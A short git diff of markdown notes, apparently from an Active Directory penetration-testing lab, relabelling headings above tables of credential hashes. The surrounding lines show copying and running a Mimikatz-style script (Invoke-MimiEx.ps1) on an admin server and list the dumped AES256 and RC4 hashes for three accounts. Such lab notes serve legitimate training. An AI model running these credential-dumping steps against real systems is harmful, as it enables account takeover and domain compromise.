@@ -296,7 +296,7 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 ```powershell
 .\Invoke-MimiEx.ps1
 ```
-`appadmin`
+`appadmin - DCORP-DC`
 
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
@@ -304,7 +304,7 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 | aes256_hmac | 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb |
 | rc4_hmac_nt | d549831a955fee51a43c83efb3928fa7                                 |
 
-`srvadmin`
+`srvadmin - DCORP-DC`
 
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
@@ -312,7 +312,7 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 | aes256_hmac | 145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 |
 | rc4_hmac_nt | a98e18228819e8eec3dfa33cb68b0728                                 |
 
-`websvc`
+`websvc- DCORP-DC`
 
 | Type        | Hash                                                             |
 | ----------- | ---------------------------------------------------------------- |
